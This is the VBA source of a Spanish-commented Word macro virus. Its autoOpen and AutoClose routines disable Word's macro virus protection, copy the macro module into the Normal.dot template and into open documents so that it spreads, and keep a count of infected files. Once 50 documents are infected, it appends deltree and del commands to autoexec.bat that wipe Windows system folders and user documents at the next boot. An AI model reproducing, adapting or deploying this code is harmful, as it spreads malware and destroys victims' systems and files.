   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "NewMacros"
   Function Infesta() As Boolean
   On Error Resume Next
   'Desabilitamos la protección contra Virus Macro
   Options.VirusProtection = False
   Application.OrganizerCopy Source:= _
           Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name, Destination:= _
           Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot", Name:= _
           "NewMacros", Object:=wdOrganizerObjectProjectItems
    If Err.Number > 0 Then
       Infesta = False
       Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
           , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
           , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
    Else
       Infesta = True
   End If
   End Function
   Sub AutoClose()
   On Error Resume Next
   Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
           , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
           , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
   If Err.Number > 0 Then
   Else
           Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Append As 1
               Print #1, "Infectado el documento" + Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name
           Close #1
    End If
    Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
    End Sub
   Sub autoOpen()
       Dim infesto As Boolean
       Dim I As Integer
       Dim Linea As String
       On Error Resume Next
       'Comenzar la infección del normal.dot si no esta infestado
       infesto = Infesta
       'Verificar si ya se infestaron 100 documentos nuevos
       I = 0
       Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Input As 1
       If Dir(Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys") <> "" Then
           Do While Not EOF(1)
               Line Input #1, Linea
               I = I + 1
           Loop
       Else
           I = 0
       End If
       Close #1
       If I > 50 Or I = 50 Then
           'Agregar este codígo al autoexec.bat
           Open "C:\autoexec.bat" For Append As 1
               Print #1, "Echo off"
               Print #1, "Echo. Autocheque del sistema, por favor espere un momento........."
               'Verificamos si existe el deltree
               If Dir("c:\windows\command\deltree.exe") <> "" Then
                   'Aquí le agregamos el codígo para eliminar el sistema completo
                   Print #1, "c:\windows\command\Deltree *.* /y"
               Else
                   'No esxiete el deltree
                   Print #1, "del *.* /q"
                   'Verificamps si es NT o Win 9x
                   If Dir("c:\winnt", vbDirectory) Then
                     Print #1, "del c:\winnt\system\*.*  /q"
                     Print #1, "del c:\winnt\system32\*.*  /q"
                     Print #1, "del c:\winnt\*.*  /q"
                     Print #1, "del c:\winnt\profiles\administrador\personal\*.* /q"
                     Print #1, "del *.*  /q"
                   End If
                   If Dir("c:\windows", vbDirectory) Then
                     Print #1, "del c:\windows\system\*.* "
                     Print #1, "del c:\windows\*.* /q"
                     If Dir("c:\mis documentos", vbDirectory) Then
                       Print #1, "del c:\mis documentos\*.*  /q"
                     End If
                     If Dir("c:\my documents", vbDirectory) Then
                       Print #1, "del c:\my documents\*.*  /q"
                     End If
                     Print #1, "del *.*  /q"
                   End If
                End If

               Print #1, "Echo on"
               Print #1, "Echo. Lo Siento pero pedro te destruyo el sistema..."
               Print #1, "Echo. Gracias por su tiempo....................."
           Close #1
       End If
   End Sub
